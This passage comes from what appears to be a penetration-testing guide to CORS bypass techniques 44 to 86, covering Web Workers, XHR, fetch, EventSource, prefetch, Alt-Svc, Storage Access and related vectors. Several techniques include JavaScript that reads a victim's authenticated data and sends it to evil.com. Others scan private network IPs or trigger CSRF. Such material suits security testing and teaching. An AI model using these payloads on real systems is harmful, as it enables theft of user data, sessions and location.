When null origin is trusted with credentials AND a context exists where data: URL pages can be created and execute JavaScript. Similar to null origin bypass but through a different vector.
Severity: MEDIUM — Limited by browser restrictions on data: URL navigation; more of a theoretical attack vector.

TECHNIQUE 44: FTP Origin CORS Trust Bypass
Steps:

Try sending an FTP scheme origin:

   Origin: ftp://target.com

Some CORS validators may check if the host matches without validating the scheme.
If ftp://target.com is reflected and trusted, check if you can serve content from an FTP server on the trusted domain.
FTP content served from a trusted domain with CORS access could be exploited.
In practice, FTP origins are rare but test regex-based validators that might not restrict scheme properly.

When it is vulnerable:
When FTP scheme origins are accepted by the CORS validator without scheme validation. If you can serve content from an FTP URL on the trusted domain (or any FTP server that passes validation), this is exploitable.
Severity: LOW — Highly theoretical; most servers do not run FTP, and FTP scheme is rarely exploitable in practice.

TECHNIQUE 45: HTTP to HTTPS CORS Downgrade Attack
Steps:

Test if an HTTPS API accepts http:// origin:

   Origin: http://trusted.target.com

If accepted, an HTTP page (potentially served on a compromised network) can make credentialed requests to the HTTPS API.
The downgrade attack: attacker intercepts traffic on the same network, serves a malicious HTTP page, which then makes credentialed cross-origin requests to the HTTPS API.
HTTP origins are lower trust (can be MITM'd) but the HTTPS API trusts them.

When it is vulnerable:
When an HTTPS endpoint trusts HTTP scheme origins. The attack requires network positioning (shared WiFi, etc.) but enables credential theft from a downgraded origin.
Severity: MEDIUM — Requires network position but bypasses HTTPS security through HTTP origin trust.

TECHNIQUE 46: HTTPS to HTTP CORS Protocol Confusion
Steps:

Test the reverse: does an HTTP application trust HTTPS origins?
Send: Origin: https://trusted.target.com to http://api.target.com
Check if the HTTP API reflects the HTTPS origin.
The confusion here is about mixed content — HTTPS pages cannot make requests to HTTP APIs due to mixed content blocking.
But some configurations may try to bridge this, creating confusion in the CORS handling.
Also test if the HTTP API adds Access-Control-Allow-Origin: https://trusted.target.com which would cause mixed content issues in browsers while appearing to be properly configured.

When it is vulnerable:
When the CORS configuration creates protocol confusion, allowing HTTPS pages to make requests to HTTP APIs (mixed content bypass) or when the CORS headers appear correct but cause mixed content violations that could be exploited.
Severity: MEDIUM — Protocol confusion may be exploitable in specific browser/network configurations.

TECHNIQUE 47: Cross-Origin Redirect CORS Policy Gap
Steps:

Find endpoints that perform HTTP redirects (301, 302, 303, 307, 308).
Make a cross-origin request to the redirecting endpoint.
Check how the CORS policy is applied after the redirect: does the redirect destination have its own CORS policy?
If the original endpoint has a permissive CORS policy but redirects to an internal endpoint, check if the browser follows the redirect with CORS credentials.
Per RFC, a redirect in a CORS request causes the Origin header to become the redirected URL's origin for subsequent requests.
Test if the redirect creates a policy gap (original permissive + redirect target lacks CORS headers).

When it is vulnerable:
When a permissive CORS endpoint redirects to an internal or restricted endpoint, and the browser follows the redirect with the original (attacker's) origin, bypassing the target endpoint's access restrictions.
Severity: HIGH — Internal endpoints accessible via cross-origin redirect chain from a trusted permissive endpoint.

TECHNIQUE 48: Same-Site vs Cross-Origin CORS Confusion
Steps:

Understand the difference between SameSite (cookies) and same-origin (CORS).
SameSite refers to the registrable domain (e.g., target.com and sub.target.com are same-site but cross-origin).
Test if cross-origin but same-site requests get different CORS treatment.
Check if the server uses SameSite logic for CORS (allowing same-site origins without checking the exact origin).
If sub.target.com is an allowed same-site origin in the CORS config (but should only be same-origin), test from sub.target.com to make credentialed requests.

When it is vulnerable:
When the CORS implementation confuses same-site with same-origin, granting broader access than intended. If sub1.target.com can make credentialed requests to sub2.target.com when only same-origin should be allowed, it is a vulnerability.
Severity: MEDIUM — Cross-subdomain data access; depends on what different subdomains expose.

TECHNIQUE 49: Private Network Access CORS Bypass
Steps:

Chrome's Private Network Access (formerly CORS-RFC1918) adds a pre-flight for requests from public internet to private network addresses.
Try making a request from a public origin to private network resources:

javascript   fetch('https://192.168.1.1/api', {credentials: 'include'})

Check if the private network resource handles the PNA preflight:

Preflight includes: Access-Control-Request-Private-Network: true
Response must include: Access-Control-Allow-Private-Network: true


If the private resource responds with Access-Control-Allow-Private-Network: true to any origin, any public website can reach it.
Check if routers, IoT devices, or local services have this misconfiguration.

When it is vulnerable:
When a private network device responds with Access-Control-Allow-Private-Network: true and a permissive Access-Control-Allow-Origin, any website visited by a user on that network can make requests to the private device.
Severity: HIGH — Public websites can access private network resources (routers, local services) on the victim's network.

TECHNIQUE 50: Local Network Access CORS Bypass via Public Origin
Steps:

This is an extension of Technique 49.
From a public-facing malicious page, try to reach local/private IP ranges:

javascript   const ips = ['192.168.1.1', '10.0.0.1', '172.16.0.1', '127.0.0.1'];
   ips.forEach(ip => {
     fetch(`http://${ip}/`, {mode: 'no-cors'}).then(() => {
       // Endpoint exists — try to access it
       fetch(`http://${ip}/api`, {credentials: 'include'})
     });
   });

Check if local services respond with permissive CORS headers.
This is particularly effective against IoT devices, internal admin panels, and home routers with default configurations.

When it is vulnerable:
When local network services (router admin, IoT devices, internal APIs) respond to cross-origin requests from public websites with permissive CORS headers. Any successful data read from a local service via a cross-origin public page is a vulnerability.
Severity: HIGH — Attacker's public webpage reads from and writes to victim's local network devices.

TECHNIQUE 51: CORS Cache Poisoning via Header Manipulation
Steps:

Identify if the CORS response is cached by a CDN or proxy (look for Cache-Control headers that allow caching, and X-Cache: HIT from the CDN).
Check if the cached response varies on the Origin header: look for Vary: Origin in the response.
If Vary: Origin is missing, the CDN may cache the CORS response for one origin and serve it to all users.
Send a request with a permissive origin to poison the cache:

   GET /api/data HTTP/1.1
   Origin: https://evil.com

If the response is cached without Vary: Origin, subsequent requests from different origins may get the cached Access-Control-Allow-Origin: https://evil.com header, even though they sent a different Origin.

When it is vulnerable:
When CORS responses are cached without Vary: Origin, and a CDN serves the same cached response (including CORS headers) to all users regardless of their actual Origin header.
Severity: HIGH — Cached CORS headers allow any origin to bypass restrictions for the duration of the cache.

TECHNIQUE 52: Service Worker CORS Bypass for Fetch
Steps:

Check if the application registers a Service Worker that intercepts fetch requests.
If you can inject JavaScript into the page (XSS or via a trusted subdomain), register a malicious Service Worker:

javascript   navigator.serviceWorker.register('https://trusted.target.com/sw.js')

The Service Worker at https://trusted.target.com/sw.js intercepts all requests from that origin.
If the Service Worker's fetch handler modifies CORS headers or makes requests on behalf of the page, it has the trusted origin's permissions.
A malicious Service Worker can exfiltrate all requests including credentials.

When it is vulnerable:
When you can inject a Service Worker on a trusted origin (via XSS or trusted code injection) and the Service Worker can intercept and relay requests. The Service Worker persists across sessions.
Severity: CRITICAL — Persistent cross-origin data interception; the Service Worker remains installed even after the XSS is fixed.

TECHNIQUE 53: Web Worker CORS Bypass for Dedicated Worker
Steps:

A dedicated Web Worker inherits the origin of the page that created it.
If you can execute JavaScript in a trusted page's context (XSS), create a Web Worker:

javascript   const worker = new Worker('data:text/javascript,fetch("https://target-api.com/data", {credentials:"include"}).then(r=>r.text()).then(d=>postMessage(d))');
   worker.onmessage = (e) => fetch('https://evil.com?d=' + e.data);

The Worker runs with the trusted page's origin and can make credentialed requests.
Check if Worker() constructor accepts data: URLs (browser-dependent).
The worker can bypass some same-origin restrictions that apply to inline scripts.

When it is vulnerable:
When combined with XSS on a trusted origin, Web Workers can make CORS requests inheriting the trusted origin's permissions. Same prerequisite as XSS but the Worker provides a cleaner execution context.
Severity: HIGH — Requires XSS but provides reliable cross-origin request capabilities.

TECHNIQUE 54: Shared Worker CORS Bypass for Cross-Origin
Steps:

Shared Workers can be accessed from multiple same-origin pages.
If you can run JavaScript on any page sharing the same origin as the target API, connect to a Shared Worker.
Shared Workers can make requests with the creating page's origin and post results back.
Create a Shared Worker on a trusted page (via XSS):

javascript   const sw = new SharedWorker('https://trusted.target.com/worker.js');
   sw.port.onmessage = (e) => fetch('https://evil.com?d=' + e.data);
   sw.port.start();
   sw.port.postMessage({action: 'fetchData', url: 'https://api.target.com/private'});

If worker.js can be controlled (via path traversal, open redirect, etc.), the Shared Worker becomes an attack proxy.

When it is vulnerable:
When a Shared Worker at a trusted origin can be manipulated to make credentialed requests, or when XSS on a trusted page allows creating a Shared Worker that persists across page navigations.
Severity: HIGH — Persistent worker with trusted origin credentials; survives page navigation.

TECHNIQUE 55: Worklet CORS Bypass for Audio/Paint Worklet
Steps:

Audio Worklets and Paint Worklets run in limited contexts with specific permissions.
Test if a Worklet loaded from a trusted origin can make network requests.
Some Worklet types have restricted network access by design.
Test if the Worklet's network requests inherit the trusted origin's CORS permissions.
If any Worklet type can make fetch requests with the trusted origin's credentials, it could be exploited via code injection into the Worklet's source.

When it is vulnerable:
When Worklets can make network requests AND their source code is modifiable (path traversal, XSS, open redirect to Worklet URL). In practice, most Worklet types have very limited network access.
Severity: LOW to MEDIUM — Worklets are highly restricted in what network access they can perform.

TECHNIQUE 56: Module Script CORS Bypass for ES Modules
Steps:

ES module scripts (<script type="module">) always use CORS mode for cross-origin imports.
Test if modules can be loaded from cross-origin URLs without CORS headers.
If an ES module can be imported from a trusted origin that serves attacker-controlled content, the module executes with the importing page's permissions.
Check: import('./exploitmodule.js') — if exploitmodule.js is on a trusted CDN or origin that serves user-controlled content, you control the module execution.
Look for endpoints that serve user-controlled JavaScript (user avatars as JS, templates with injection, etc.).

When it is vulnerable:
When the application imports ES modules from user-controllable URLs, or when a trusted CDN/origin serves user-controlled JavaScript files that are imported as modules.
Severity: HIGH — Module execution in the trusted origin's context; full same-origin access to DOM and credentials.

TECHNIQUE 57: Classic Script CORS Bypass for Legacy Scripts
Steps:

Classic <script> tags perform no CORS check — they load scripts from any origin.
However, the crossorigin attribute can be added to enforce CORS on classic scripts.
Check if the application loads classic scripts from a CDN or third-party origin.
If any of those third-party origins are compromised (supply chain attack), the scripts execute with full same-origin access.
Test: change the script URL parameter in the page to point to your server:

html   <script src="https://evil.com/malicious.js"></script>
(Only if the URL is configurable by user input — like a URL parameter that specifies which JS file to load.)
When it is vulnerable:
When the application loads scripts from a user-controllable source, or from a third-party CDN that can be compromised. The script executes without any CORS restriction, with full access to the page's data.
Severity: CRITICAL — Script injection; complete page takeover, credential theft, and session hijacking.

TECHNIQUE 58: Font Loading CORS Bypass for Web Fonts
Steps:

Web fonts loaded cross-origin require CORS headers.
Check if fonts are loaded with the CORS crossorigin attribute.
If a font CDN serves fonts without CORS headers but the browser loads them anyway (older browsers or crossorigin attribute absent), it is less of a security issue but indicates misconfiguration.
A more interesting attack: if the CSS @font-face rule loads a font URL that reflects query parameters, test if font loading can be used as a timing oracle to determine if CSS rules are applied.
CSS injection + @font-face can be used for data exfiltration in XSS-limited environments.

When it is vulnerable:
When cross-origin fonts lack proper CORS headers (affecting font rendering in some browsers) OR when font URLs are user-controllable and can be used as timing/exfiltration oracles.
Severity: LOW — Primarily usability issue; security impact limited to CSS injection scenarios.

TECHNIQUE 59: Image CORS Bypass via crossorigin Attribute
Steps:

Images loaded without crossorigin attribute are loaded in "no-cors" mode — no CORS check, but the image data is not accessible to JavaScript (canvas.getImageData() is blocked as tainted).
Add crossorigin="anonymous" to an image tag and check if the image loads (CORS headers required from the server).
If images load with crossorigin="anonymous" and the server sends proper CORS headers, JavaScript can access pixel data.
Test if the image URL can be manipulated to load images from attacker-controlled origins.
Check if any API returns image data (user photos, etc.) with overly permissive CORS headers that allow JavaScript to read the pixel data.

When it is vulnerable:
When private images (profile photos, medical images, document scans) are served with CORS headers allowing JavaScript access to pixel data. An attacker page can load the private image with crossorigin="anonymous" and extract the pixel data.
Severity: MEDIUM — Private image content disclosed to attacker's JavaScript; depends on sensitivity of images.

TECHNIQUE 60: Video CORS Bypass for Media Elements
Steps:

Similar to images, video elements can be loaded cross-origin.
Adding crossorigin="anonymous" to <video> allows canvas extraction of video frames.
Test if private/restricted videos serve CORS headers allowing JavaScript frame extraction.
If a video at https://secure-video.target.com/private-video.mp4 has CORS headers allowing evil.com, JavaScript can extract frames.
Also check if video subtitle/track files (WebVTT) are accessible cross-origin — these might contain sensitive closed caption data.

When it is vulnerable:
When restricted videos are served with permissive CORS headers, enabling JavaScript from other origins to draw video frames to a canvas and extract the content.
Severity: MEDIUM — Private video content disclosed; particularly concerning for sensitive video recordings.

TECHNIQUE 61: Audio CORS Bypass for Audio Elements
Steps:

Audio elements follow the same cross-origin rules as video.
Web Audio API (AudioContext) requires CORS for cross-origin audio data analysis.
If private audio is served with permissive CORS headers, JavaScript can use AudioContext.decodeAudioData() to access the raw audio samples.
Test:

javascript   const audio = new Audio('https://private-audio.target.com/recording.mp3');
   audio.crossOrigin = 'anonymous';
   const ctx = new AudioContext();
   const source = ctx.createMediaElementSource(audio);
   // Now connected to AudioContext, can analyze audio data

Check if the audio endpoint validates Origin for the CORS response.

When it is vulnerable:
When private audio recordings (voicemails, call recordings) are served with permissive CORS, allowing JavaScript from other origins to access and transmit the audio data.
Severity: MEDIUM to HIGH — Private audio content (calls, voicemails, recordings) exposed to cross-origin JavaScript.

TECHNIQUE 62: Style CORS Bypass for CSS Cross-Origin
Steps:

CSS stylesheets loaded with <link> do not enforce CORS by default.
However, @import in existing stylesheets and CSS OM access do require proper origin handling.
Test if CSS from cross-origin can be read via JavaScript:

javascript   const link = document.createElement('link');
   link.rel = 'stylesheet';
   link.href = 'https://target.com/styles.css';
   document.head.appendChild(link);
   // Try to read rules
   for (const sheet of document.styleSheets) {
     if (sheet.href.includes('target.com')) {
       console.log(sheet.cssRules); // Will throw DOMException if cross-origin
     }
   }

If the stylesheet loads with CORS headers, CSS rules become accessible to JavaScript.
CSS might contain sensitive data in custom properties or comments.

When it is vulnerable:
When CSS files contain sensitive information (CSRF tokens in CSS custom properties, dynamic CSS with user data) and serve permissive CORS headers allowing JavaScript to access CSS rules cross-origin.
Severity: LOW to MEDIUM — Depends on what sensitive data might be in CSS; unusual but possible.

TECHNIQUE 63: Object CORS Bypass for Plugin Content
Steps:

<object> and <embed> tags load plugin content (Flash, PDF in browsers that support it).
These are largely deprecated but some legacy applications still use them.
Test if <object> content (particularly PDF plugins) can be loaded cross-origin.
If a plugin has cross-origin communication capabilities, it might bypass CORS.
PDFs loaded in <object> elements from cross-origin don't allow JavaScript access to their content without CORS.

When it is vulnerable:
When legacy plugin-based content (Flash SWFs, legacy PDF viewers) allows cross-origin communication without CORS. Primarily historical; rare in modern applications.
Severity: LOW — Legacy concern; most browsers have removed plugin support.

TECHNIQUE 64: Embed CORS Bypass for Embedded Content
Steps:

<embed> tags are used for embedded content like PDFs.
Modern browsers load PDFs in <embed> tags using built-in PDF viewers.
Test if an embedded PDF from a cross-origin source can have its content read by JavaScript.
The built-in PDF viewer has same-origin restrictions for scripting.
Check if the embedded content URL can be manipulated to load from a different (attacker-controlled) origin.

When it is vulnerable:
When <embed> allows loading content from an attacker-controlled URL through URL parameter injection, and the loaded content can interact with the embedding page.
Severity: LOW — Limited attack surface in modern browsers; plugin embeds are restricted.

TECHNIQUE 65: Link Prefetch CORS Bypass for Resource Hints
Steps:

<link rel="prefetch"> pre-fetches a resource for future navigation.
Cross-origin prefetch requests may include cookies and go without CORS validation (no-CORS mode).
Test if prefetch can be used to trigger server-side actions on cross-origin endpoints:

html   <link rel="prefetch" href="https://target.com/api/action?param=value">

The request will include cookies, potentially triggering server-side actions.
Check if the server-side endpoint performs write operations on GET requests (anti-pattern).

When it is vulnerable:
When cross-origin prefetch requests trigger server-side state changes (because the endpoint uses GET for write operations) and the server does not validate the Referer or Origin headers.
Severity: MEDIUM — Requires server-side GET-based state changes; enables CSRF-like attacks via prefetch.

TECHNIQUE 66: Prefetch CORS Bypass for Resource Prefetch
Steps:

Similar to Technique 65. Expand to test <link rel="prefetch"> specifically for API caching behavior.
Check if prefetched responses are stored in the HTTP cache.
If so, attacker pages can "seed" a user's browser cache with malicious content via cross-origin prefetch.
When the user later visits the legitimate site, they receive the cached (malicious) response.
This is a cache poisoning via prefetch attack.

When it is vulnerable:
When cross-origin prefetch requests are cached by the browser without proper cache key (including the origin) and the attacker can control what response is cached for a given URL.
Severity: MEDIUM — Cache poisoning via prefetch; subsequent legitimate requests serve malicious content.

TECHNIQUE 67: Prerender CORS Bypass for Speculative Load
Steps:

<link rel="prerender"> causes the browser to fully render a page in the background.
A prerendered page can make additional requests, all appearing to originate from the prerendered page's URL.
Test if an attacker page can prerender a trusted origin's page that then makes API requests.
The prerendered page's requests include the trusted origin as referrer.
Check if server-side logic trusts the Referer header from the prerendered page.

When it is vulnerable:
When server-side CSRF protection relies on the Referer header, and a prerender of a trusted page triggers the desired API action. Combines CORS with CSRF via the speculative load mechanism.
Severity: MEDIUM — Specific to Referer-based CSRF protection; requires server to trust Referer.

TECHNIQUE 68: Speculative CORS Bypass for Speculative Fetch
Steps:

Chrome's Speculation Rules API allows speculative prefetch and prerender:

html   <script type="speculationrules">
   {
     "prefetch": [{"source": "list", "urls": ["https://target.com/api/action"]}]
   }
   </script>

Speculation rules can trigger cross-origin fetches.
Test if speculation-triggered requests bypass CORS validation or trigger server-side actions.
The requests include cookies as they are made in the context of the page.

When it is vulnerable:
When speculation rules can trigger cross-origin GET requests to endpoints that perform write operations, bypassing CORS restrictions that would apply to explicit fetch() calls.
Severity: MEDIUM — Emerging attack surface; depends on server-side GET-based state changes.

TECHNIQUE 69: Early Hints CORS Bypass for 103 Response
Steps:

HTTP 103 Early Hints allows servers to send resource hints before the main response.
Early Hints can include Link: headers with rel=preconnect, rel=preload, or rel=prefetch.
Test if the server's 103 response can be manipulated to pre-connect or pre-fetch cross-origin attacker-controlled resources.
Check if early hints establish cross-origin connections that bypass normal CORS flow.
Also check if 103 responses are cached and can be poisoned.

When it is vulnerable:
When Early Hints can be manipulated to cause the browser to establish connections or fetch resources in ways that bypass CORS checking or leak information through timing.
Severity: LOW — Very limited attack surface; Early Hints do not bypass CORS for actual data reads.

TECHNIQUE 70: Alt-Svc CORS Bypass for Alternative Service
Steps:

Alt-Svc header tells browsers that a service is available at an alternative location.
Test if Alt-Svc can redirect connections to an attacker-controlled server:

Inject Alt-Svc: h3=":443"; ma=86400 with the alternate server.


If an attacker can inject Alt-Svc headers (through MITM or response header injection), the browser connects to the attacker's server for subsequent requests to that domain.
The browser sends origin-matching CORS headers to the attacker's server, which returns permissive CORS responses.
This enables a transparent man-in-the-middle with CORS cooperation.

When it is vulnerable:
When Alt-Svc headers can be injected (via MITM, header injection, or CDN configuration) and redirect browser connections to attacker-controlled servers. The browser believes it is connecting to the legitimate origin.
Severity: CRITICAL — Transparent MITM with full CORS bypass; complete data interception.

TECHNIQUE 71: Web Bundle CORS Bypass for Bundled Resources
Steps:

Web Bundles (WPACK) package multiple resources into a single bundle.
Test if resources within a web bundle have different CORS policies than their standalone counterparts.
Check if a web bundle from a trusted origin can contain cross-origin resources that bypass individual CORS checks.
Test if the bundle's signature and origin validation is properly implemented.
Look for web bundle implementations that serve content from the bundle's origin regardless of the individual resource's original origin.

When it is vulnerable:
When web bundles allow resources from untrusted origins to be served with a trusted origin's CORS headers, or when bundle validation is insufficient to prevent tampered bundles from being accepted.
Severity: MEDIUM — Emerging technology; security properties still being established.

TECHNIQUE 72: Navigation CORS Bypass for Top-Level Navigation
Steps:

Top-level navigations (window.location, anchor tags) are not restricted by CORS.
Test if navigating to a cross-origin URL leaks information through the navigation itself.
Check if URL fragments can be used to pass data cross-origin via navigation:

javascript   window.location = 'https://target.com/page#' + encodeURIComponent(sensitiveData);

The fragment is sent to the target and can be read by JavaScript on that page.
Test if navigation can be used to trigger actions on the target page (CSRF via navigation + URL parameters).
Also check if history.pushState can be used to spoof the URL without actual navigation.

When it is vulnerable:
When top-level navigation to a cross-origin URL triggers server-side actions (GET-based CSRF), or when fragments carry sensitive data that the target page processes. No CORS restriction on navigation means state changes via URLs are possible.
Severity: MEDIUM — CSRF via navigation; requires GET-based state changes or fragment data processing.

TECHNIQUE 73: Form Submission CORS Bypass for Cross-Origin Form
Steps:

HTML form submissions are not restricted by CORS (they are "simple requests" for simple methods and content types).
<form method="POST" action="https://target.com/api/action"> submits cookies cross-origin without CORS restriction.
This is the classic CSRF attack vector.
Check if multipart/form-data or application/x-www-form-urlencoded form submissions trigger the same server-side actions as JSON API calls.
Test if the server-side lacks CSRF protection (checking Origin, Referer, or CSRF token).
Try all HTTP methods and form encodings.

When it is vulnerable:
When cross-origin form submissions trigger state-changing actions (POST to /api/delete, /api/transfer, etc.) without CSRF token validation. Any state change via form POST without CSRF token is a classic CSRF vulnerability enabled by the lack of CORS restriction on form submissions.
Severity: HIGH — Classic CSRF; state-changing actions (money transfers, account deletion, data modification) from any web page.

TECHNIQUE 74: XHR CORS Bypass for XMLHttpRequest
Steps:

XMLHttpRequest (XHR) is the older AJAX mechanism.
By default, XHR does not send cookies cross-origin unless xhr.withCredentials = true.
Test if the target endpoint allows Access-Control-Allow-Credentials: true with origin reflection (see Technique 1).
If yes, use XHR with credentials:

javascript   var xhr = new XMLHttpRequest();
   xhr.open('GET', 'https://target.com/api/userdata', true);
   xhr.withCredentials = true;
   xhr.onreadystatechange = function() {
     if (xhr.readyState == 4) {
       fetch('https://evil.com/?d=' + encodeURIComponent(xhr.responseText));
     }
   };
   xhr.send();

Check the responseText — if it contains user data, the CORS bypass works.

When it is vulnerable:
When the server reflects the attacker's origin in Access-Control-Allow-Origin AND sets Access-Control-Allow-Credentials: true. XHR with credentials successfully fetches authenticated data cross-origin.
Severity: HIGH — Authenticated data theft via XHR; same as Technique 1 but using XHR specifically.

TECHNIQUE 75: Fetch API CORS Bypass for Fetch Requests
Steps:

The Fetch API is the modern replacement for XHR.
Test the same CORS misconfiguration as Technique 74 but using Fetch:

javascript   fetch('https://target.com/api/userdata', {
     method: 'GET',
     credentials: 'include',
     mode: 'cors'
   })
   .then(r => r.json())
   .then(data => fetch('https://evil.com/?d=' + JSON.stringify(data)));

Fetch also supports mode: 'no-cors' — test this to see what data is accessible without CORS headers.
With no-cors mode, the response is "opaque" (no data readable) but the request IS sent (including cookies).
Use no-cors for CSRF (state-changing requests); use cors with credential reflection for data theft.

When it is vulnerable:
When credentials: 'include' with mode: 'cors' succeeds and returns authenticated data. Also when mode: 'no-cors' can trigger state changes (CSRF-equivalent).
Severity: HIGH — Core mechanism for modern CORS exploitation; authenticated data theft.

TECHNIQUE 76: Beacon API CORS Bypass for sendBeacon
Steps:

navigator.sendBeacon() sends data to a URL asynchronously, primarily for analytics.
Beacon requests are POST with Content-Type: text/plain, application/x-www-form-urlencoded, or multipart/form-data (simple request types).
Beacon requests do NOT support withCredentials but DO send cookies if the request is same-site.
Test if Beacon can be used to trigger cross-origin actions:

javascript   navigator.sendBeacon('https://target.com/api/action', new Blob(['data=value'], {type: 'text/plain'}));

The beacon is sent with cookies for same-site requests; cross-site with SameSite=None cookies.

When it is vulnerable:
When sensitive server-side actions can be triggered via Beacon POST requests without CSRF token validation. Beacons cannot be blocked by navigating away from the page, making them reliable CSRF vectors.
Severity: MEDIUM to HIGH — CSRF via Beacon; particularly difficult to interrupt since beacons are designed to survive navigation.

TECHNIQUE 77: Event Source CORS Bypass for SSE Connections
Steps:

Server-Sent Events (SSE) use the EventSource API to receive server-to-client messages.
EventSource always uses GET and does not support CORS in the traditional sense — it is not a "CORS request" but a browser-managed connection.
Test if EventSource can be used to establish a cross-origin connection:

javascript   const es = new EventSource('https://target.com/api/events', {withCredentials: true});
   es.onmessage = (e) => fetch('https://evil.com?d=' + e.data);

With withCredentials: true, cookies are sent cross-origin to the SSE endpoint.
The server must respond with proper CORS headers for the SSE stream.
If the server reflects the attacker's origin and allows credentials, all SSE messages are exfiltrated.

When it is vulnerable:
When the SSE endpoint reflects the attacker's origin in Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true. The attacker receives all real-time server events intended for the victim.
Severity: HIGH — Real-time data stream intercepted; potentially includes notifications, chat messages, live data feeds.

TECHNIQUE 78: Media Source CORS Bypass for Media Streaming
Steps:

Media Source Extensions (MSE) allow JavaScript to feed media data to <video> or <audio> elements.
The media data must be fetched — these fetch requests follow CORS.
Check if the media segment endpoints (HLS/DASH manifest and segments) have CORS configured correctly.
If a private video stream's CORS headers allow attacker origins, JavaScript can receive the media segments.
Test:

javascript   fetch('https://target.com/stream/private-video/manifest.m3u8', {credentials: 'include'})
   .then(r => r.text())
   .then(m => /* parse and fetch segments */);
When it is vulnerable:
When media segment endpoints have permissive CORS headers, allowing attacker origins to fetch private media content programmatically.
Severity: HIGH — Private video/audio content (meetings, personal videos) streamed to attacker.

TECHNIQUE 79: WebRTC CORS Bypass for Peer Connections
Steps:

WebRTC establishes peer-to-peer connections and is NOT subject to CORS.
However, the signaling server (which coordinates the connection setup) typically uses WebSocket or HTTP and IS subject to CORS.
Test if the WebRTC signaling server has CORS misconfiguration:

javascript   // Connect to signaling server
   const ws = new WebSocket('wss://target.com/signaling');
   // OR via HTTP:
   fetch('https://target.com/api/webrtc/offer', {
     method: 'POST',
     credentials: 'include',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({sdp: '...'})
   });

If the signaling endpoint has CORS misconfiguration, the attacker can join WebRTC sessions.
Also check ICE server configuration for STUN/TURN credentials exposed in JavaScript.

When it is vulnerable:
When the WebRTC signaling server has CORS misconfiguration allowing unauthorized origins to initiate or join peer connections. TURN server credentials exposed in JavaScript also enable unauthorized use of the media relay.
Severity: HIGH — Real-time communication sessions joined or manipulated; video/audio calls intercepted.

TECHNIQUE 80: WebAssembly CORS Bypass for Module Compilation
Steps:

WebAssembly modules loaded cross-origin require CORS headers with application/wasm content type.
Test if WASM modules are loaded from cross-origin sources without proper CORS:

javascript   WebAssembly.instantiateStreaming(fetch('https://target.com/private-module.wasm'))
   .then(result => /* use module */);

If the WASM module endpoint has permissive CORS, attacker origins can download and use private WASM modules.
The WASM module might contain proprietary algorithms or sensitive business logic.
Also test if WASM modules can exfiltrate memory contents when executed cross-origin.

When it is vulnerable:
When private WASM modules (containing proprietary algorithms, encryption implementations, or sensitive logic) are accessible cross-origin due to permissive CORS headers.
Severity: MEDIUM — Intellectual property theft (proprietary algorithms); limited direct data exfiltration risk.

TECHNIQUE 81: Notification CORS Bypass for Push Notifications
Steps:

Push notification subscriptions are tied to a service worker registration, which has same-origin restrictions.
Test if push subscription endpoints have CORS misconfiguration.
The push subscription endpoint (where your server sends push messages) should only be reachable by the server.
Check if the VAPID keys or push subscription information is accessible cross-origin.
If an attacker can read the push subscription details cross-origin, they can send unauthorized push notifications to users.
Test the push message delivery endpoint for CORS misconfiguration.

When it is vulnerable:
When push subscription details are exposed cross-origin (CORS on the subscription info endpoint), allowing attacker servers to send push notifications to users on behalf of the legitimate service.
Severity: HIGH — Unauthorized push notifications; phishing at scale through browser notifications.

TECHNIQUE 82: Payment CORS Bypass for Payment Requests
Steps:

Payment Request API handles payment flow in the browser.
Check if payment-related endpoints have CORS misconfiguration.
Test if payment verification or processing endpoints are accessible cross-origin:

javascript   fetch('https://target.com/api/payment/verify', {
     method: 'POST',
     credentials: 'include',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({paymentId: '12345'})
   });

If CORS allows reading payment status cross-origin, an attacker can check payment completion and order fulfillment status.
Also check if payment initiation endpoints can be triggered cross-origin (CSRF on payment).

When it is vulnerable:
When payment endpoints allow cross-origin reads of payment status (order information, receipt data) or when payment actions can be triggered cross-origin (CSRF leading to unauthorized payments).
Severity: HIGH to CRITICAL — Financial transaction data exposed; unauthorized payment initiation.

TECHNIQUE 83: Credential Management CORS Bypass
Steps:

The Credential Management API stores and retrieves credentials.
navigator.credentials.get() is restricted to same-origin.
Test if credential storage/retrieval APIs are exposed cross-origin.
Check if any credential-related endpoints (password reset, credential listing) have CORS misconfiguration.
Test if navigator.credentials.store() can be triggered cross-origin to overwrite legitimate credentials with attacker-controlled ones.

When it is vulnerable:
When credential management endpoints (login, password reset, credential update) are accessible cross-origin due to CORS misconfiguration, allowing credential theft or replacement from an attacker's page.
Severity: CRITICAL — Credential theft or replacement leads directly to account takeover.

TECHNIQUE 84: Permission CORS Bypass for Permission Queries
Steps:

The Permissions API allows checking browser permission status.
navigator.permissions.query({name: 'geolocation'}) reveals if geolocation is granted.
This is same-origin restricted, but check if any server-side permission endpoints have CORS misconfiguration.
Test: if user permission data (notification permission, camera permission) is stored server-side and served via an API, check CORS on that API.
Permission status can reveal user behavior patterns.

When it is vulnerable:
When server-side user permission preferences are exposed via a CORS-misconfigured API, leaking information about user settings and preferences cross-origin.
Severity: LOW to MEDIUM — Information disclosure; permission status can reveal user behavior but has limited direct exploitation value.

TECHNIQUE 85: Geolocation CORS Bypass for Location Access
Steps:

Geolocation data is browser API-level — the Geolocation API is same-origin restricted.
However, if location data is stored server-side and served via an API, check CORS on that API.
Test:

javascript   fetch('https://target.com/api/user/location', {credentials: 'include'})
   .then(r => r.json())
   .then(loc => fetch('https://evil.com?lat=' + loc.lat + '&lng=' + loc.lng));

If the location API reflects attacker origins with credentials, the victim's stored location is exfiltrated.
Also check if location-based features can be triggered cross-origin (e.g., setting a new location).

When it is vulnerable:
When stored geolocation data is served via an API with permissive CORS headers, allowing cross-origin reads of the victim's physical location history.
Severity: HIGH — Physical location data of users is highly sensitive; stalking and physical safety implications.

TECHNIQUE 86: Storage CORS Bypass for Storage Access
Steps:

Browser storage APIs (localStorage, sessionStorage, IndexedDB, cookies) are same-origin restricted by design.
However, the Storage Access API (document.requestStorageAccess()) allows cross-origin iframes to access cookies.
Test if the Storage Access API is improperly configured:

javascript   // Inside a cross-origin iframe
   document.requestStorageAccess().then(() => {
     // Now has cookie access — in properly configured browsers, this requires user gesture
     document.cookie; // Reads cookies of the parent domain
   });

Check if the application grants storage access to iframes without proper user gesture requirement.
Test if cross-origin iframes can be embedded in attacker pages and then granted storage access.

When it is vulnerable:
When Storage Access API requests are granted without requiring a user gesture, or when the application grants storage access to arbitrary cross-origin iframes. Cookie access across domains enables session theft.
Severity: HIGH — Cross-origin session cookie access; full account takeover.

